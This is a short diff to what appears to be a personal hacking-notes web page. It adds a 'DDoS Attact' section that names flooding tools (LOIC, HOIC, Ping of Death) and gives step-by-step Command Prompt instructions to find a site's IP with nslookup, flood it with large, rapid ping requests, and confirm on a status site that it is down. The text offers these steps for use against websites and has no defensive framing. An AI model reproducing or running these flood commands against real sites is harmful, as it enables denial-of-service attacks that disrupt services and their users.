@@ -40,3 +40,19 @@ inurl:/admin/index.php / login.php/ user.php
 	4. QuickStego Software
 	5. OpenStego Software
 </p>
+<h1>/////************ 13-11-2021  DDoS Attact ************\\\\\\ </h1>
+<p>
+	1. Distributed Denial of Service (DDoS) Attact
+	  ***Populer Tools
+	2. LOIC (Low Orbit Ion Canon)
+	3. HOIC (High Orbit Ion Canon)
+	4. Ping of Death
+	5. First CMD (Command Prompt) Open and type now (for website IP show)
+	6. => nslookup site name
+	   =>ping (site IP) -t -l 65500 -n 1000000 -w 0.00001
+	   -t = pings the specified host until stopped
+	   -l = send buffer size
+	   -n 10000000 = Count Number of echo requests to send
+	   -w 0.00001 = Timeout in milliseconds to wait for each reply. 
+	7. isitdownrightnow . com check for website Down status ..
+</p>
